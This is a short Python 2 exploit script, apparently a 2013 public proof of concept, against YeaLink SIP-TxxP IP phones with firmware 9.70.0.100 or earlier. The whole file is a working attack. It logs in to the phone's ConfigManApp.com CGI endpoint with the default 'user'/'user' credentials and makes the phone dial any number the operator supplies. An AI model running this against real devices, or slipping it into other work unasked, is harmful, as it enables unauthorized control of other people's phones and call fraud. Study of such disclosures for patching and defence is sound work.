#!/usr/bin/python
  
import urllib2, sys
  
print "\n YeaLink IP Phone SIP-TxxP firmware <=9.70.0.100 phone call vulnerability - b0rh (francisco<[at]>garnelo.eu) - 2013-05-28 \n"
 
if (len(sys.argv) != 3):
    print ">> Use: " + sys.argv[0] + " <IP Phone> <phone number>"
    print ">> Ex: " + sys.argv[0] + " 127.0.0.1 123456789\n"
    exit(0)
  
IP = sys.argv[1]
num = sys.argv[2]
UrlGet_params = 'http://%s/cgi-bin/ConfigManApp.com?Id=34&Command=1&Number=%s&Account=0&sid=0.724202975169738' % (IP, num)
webU = 'user'
webP = 'user'
 
query = urllib2.HTTPPasswordMgrWithDefaultRealm()
query.add_password(None, UrlGet_params, webU, webP)
auth = urllib2.HTTPBasicAuthHandler(query)
log = urllib2.build_opener(auth)
 
 
urllib2.install_opener(log)
 
queryPag = urllib2.urlopen(UrlGet_params)
 
print "\n Call to %s form IP phone %s\n" %(num,IP)



